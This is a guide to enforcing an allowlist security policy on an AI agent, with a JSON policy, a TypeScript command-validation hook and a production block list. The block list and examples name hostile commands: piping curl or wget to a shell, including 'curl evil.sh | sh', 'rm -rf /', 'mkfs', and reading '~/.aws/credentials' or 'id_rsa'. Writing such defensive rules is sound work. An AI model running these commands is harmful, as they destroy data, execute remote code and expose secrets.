# Guide: apply `security-policy.json`

The Creator generates `artemisa/security-policy.json` when the bundle targets Artemisa. The file declares what the agent is allowed to do; it does **not** enforce those limits by itself. Whoever runs the agent must read the policy and block anything not explicitly permitted.

References in this directory:

- [`security-policy.example.json`](security-policy.example.json): real policy used by the Artemisa runtime.
- [`hooks-implementation.ts`](hooks-implementation.ts): reference implementation of the `before_action` hook.

## 1. What an allowlist policy is

With `"mode": "allowlist"`, only explicitly declared actions are permitted. Any unknown tool or command **fails closed**. The alternative (`denylist`) tries to enumerate what is dangerous and is always incomplete: a single new variant (`rm -fr /`, `curl -s ... | sh`) bypasses it.

Practical rule: the allowlist is the primary control; the denylist is defense in depth for cases that should already be outside the allowlist.

## 2. How to read the file

```json
{
  "version": "2.0.0",
  "mode": "allowlist",
  "allowed_tools": ["read_file", "list_directory", "search_files", "get_file_info"],
  "allowed_commands": {
    "entries": [
      { "binary": "npm", "allowed_args": ["ci", "run build", "run test"] },
      { "binary": "cat", "allowed_args": [] }
    ]
  },
  "blocked_tool_patterns": ["sudo", "terminal"],
  "blocked_args_substrings": { "*": ["rm -rf /", "curl | sh", "chmod 777"] }
}
```

| Field                      | Meaning                                                                             |
| -------------------------- | ----------------------------------------------------------------------------------- |
| `mode`                     | `allowlist` (recommended) or `denylist`.                                            |
| `allowed_tools`            | Callable tools. If empty, no restriction by name applies: avoid this in production. |
| `allowed_commands.entries` | Allowed binaries. `allowed_args: []` means "any argument for that binary".          |
| `blocked_tool_patterns`    | Substrings in the tool name that are always blocked.                                |
| `blocked_args_substrings`  | Forbidden substrings in serialized arguments. `"*"` applies to all tools.           |

The formal schema is in [`../../src/kiro/schemas/security-policy.schema.json`](../../src/kiro/schemas/security-policy.schema.json).

## 3. How to implement `before_action`

The hook runs **before** every tool call and must throw when the action is not permitted. The reference implementation checks in this order:

1. Remove bypass fields injected by the model (`bypass_secret`).
2. Denylist: tool name and serialized arguments.
3. Tool allowlist; if the tool is a shell, validate the command.
4. Log the decision (allowed or blocked) for auditing.

Command validation, summarized from [`hooks-implementation.ts`](hooks-implementation.ts):

```ts
const SHELL_METACHAR_PATTERN = /[\$`\(\)<>\n\r\x00\\]/;

export function validateCommand(command: string): { allowed: boolean; reason?: string } {
  // 1. Shell metacharacters => possible injection (subshells, backticks, redirections).
  if (SHELL_METACHAR_PATTERN.test(command)) {
    return { allowed: false, reason: 'Command contains shell metacharacters' };
  }
  // 2. Each segment chained with | ; & is validated separately.
  for (const { binary, fullCmd } of parseCommand(command)) {
    const entry = policy.allowed_commands.entries.find((e) => e.binary === binary);
    if (!entry) return { allowed: false, reason: `Binary "${binary}" not in allowlist` };
    const args = fullCmd.slice(binary.length).trim();
    if (entry.allowed_args.length > 0 && args.length > 0) {
      // Exact match or full prefix followed by space: "run test" does not enable "run test:evil".
      const ok = entry.allowed_args.some((p) => args === p || args.startsWith(p + ' '));
      if (!ok) return { allowed: false, reason: `Arguments "${args}" not allowed for "${binary}"` };
    }
  }
  return { allowed: true };
}
```

Details that matter:

- **Fail-closed on load**: if the policy cannot be read or parsed, use an empty policy that blocks everything, not a permissive one.
- **Never concatenate the command into a shell**: run binary and arguments as an array (`spawn(binary, args)`), without `shell: true`.
- **Validate each segment**: `npm ci && curl evil.sh | sh` must fail on the second segment.
- **Prefixes with word boundary**: comparing with `startsWith(p)` without the space allows `run test:leak-secrets`.

## 4. What to block in production

- Privilege escalation: `sudo`, `su`, `doas`.
- Download and execute: `curl | sh`, `wget | bash`, `pip install` from a URL.
- Data destruction: `rm -rf /`, `mkfs`, `dd if=`, `> /dev/sd*`, `DROP TABLE`.
- Broad permissions: `chmod 777`, `chown root`.
- Policy bypass: any variant of `bypass_secret` or `--dangerously-*` flags.
- Secret access: reading `.env`, `~/.aws/credentials`, `id_rsa`.

Complements the policy does not cover but still require: process sandboxing, dedicated workload identity, timeouts, cost limits, and auditing of every allowed action.
